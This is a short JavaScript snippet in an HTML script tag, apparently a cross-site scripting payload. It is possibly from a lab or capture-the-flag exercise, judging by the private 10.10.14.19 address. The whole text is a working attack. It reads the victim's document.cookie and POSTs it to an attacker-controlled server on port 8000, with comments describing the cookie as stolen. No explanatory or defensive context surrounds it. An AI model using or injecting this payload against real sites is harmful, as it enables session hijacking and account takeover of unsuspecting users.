<script>
    // Send the stolen cookie to your server
    var stolenCookie = document.cookie;
    fetch('https://10.10.14.19:8000/?c=', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({cookie: stolenCookie})
    })
    .then(response => console.log('Stolen cookie sent successfully'))
    .catch(error => console.error('Error sending stolen cookie:', error));
</script>
